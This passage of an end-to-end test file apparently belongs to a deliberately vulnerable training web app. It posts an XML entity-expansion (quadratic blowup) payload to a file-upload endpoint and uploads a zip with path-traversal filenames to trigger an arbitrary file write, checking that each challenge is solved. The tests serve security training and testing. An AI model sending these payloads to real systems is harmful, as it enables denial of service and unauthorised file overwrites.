>]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>'], {type: 'application/xml'})
        data.append('file', blob, 'xxeQuadraticBlowup.xml')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.sleep(3000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'XXE Tier 2' })
  })

  describe('challenge "arbitraryFileWrite"', () => {
    it('should be possible to upload zip file with filenames having path traversal', () => {
      browser.waitForAngularEnabled(false)
      browser.get('/#/complain')
      var file = element(by.id('file'))
      var submitButton = element(by.id('submitButton'))
      var complaintMessage = element(by.id('complaintMessage'))
      var fileToUpload = 'test/files/arbitraryFileWrite.zip'
      var absoluteFilePath = path.resolve(fileToUpload)
      complaintMessage.sendKeys('test')
      file.sendKeys(absoluteFilePath)
      submitButton.click()
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Arbitrary File Write' })
  })
})
